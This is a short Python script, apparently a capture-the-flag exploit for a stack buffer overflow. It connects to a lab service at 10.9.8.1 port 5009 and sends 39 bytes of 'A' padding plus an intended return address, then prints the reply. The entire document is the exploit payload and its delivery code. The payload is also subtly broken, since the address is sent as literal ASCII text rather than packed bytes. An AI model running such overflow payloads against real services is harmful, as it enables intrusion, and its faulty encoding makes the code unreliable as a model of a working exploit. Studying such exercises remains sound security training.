import socket

def netcat(content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.9.8.1', 5009))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    while 1:
        data = s.recv(1024)
        if len(data) == 0:
            break
        print("Received:", repr(data))
    print("Connection closed.")
    s.close()

content = b'A' * 39 + b'0x00000000004011ab'

netcat(content)
